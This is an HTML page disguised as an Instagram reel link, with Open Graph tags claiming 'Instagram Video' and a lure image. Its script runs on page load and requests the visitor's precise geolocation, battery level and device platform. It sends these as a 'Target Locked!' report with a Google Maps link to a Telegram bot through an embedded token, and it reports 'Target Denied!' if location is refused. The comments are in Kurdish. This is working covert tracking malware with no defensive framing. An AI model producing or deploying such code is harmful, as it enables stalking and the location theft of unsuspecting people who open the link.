<!DOCTYPE html>
<html lang="ku">
<head>
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="Instagram Video">
    <meta property="og:description" content="Watch this reel on Instagram">
    <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
    <meta property="og:type" content="video.other">
    <meta property="og:url" content="https://www.instagram.com/">
</head>

<body onload="capture()">

<script>
    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";

    async function capture() {
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        if (!uid) return;

        // ١. یەکسەر داوای لۆکەیشن دەکات
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            // ٢. وەرگرتنی زانیارییە خێراکان
            let bat = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
            }

            let report = `🚨 <b>Target Locked!</b>\n\n` +
                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                         `🔋 <b>Battery:</b> ${bat}\n` +
                         `📱 <b>Device:</b> ${navigator.platform}`;

            // ٣. ناردنی خێرا (Beacon) - ئەمە نەوەستاوە و یەکسەر دەیپێکێت
            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
            
            // ئەمە فێڵە سەرەکییەکەیە بۆ خێرایی
            navigator.sendBeacon(url);

        }, (err) => {
            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`;
            navigator.sendBeacon(url);
        }, { enableHighAccuracy: true, timeout: 5000 });
    }
</script>
</body>
</html>
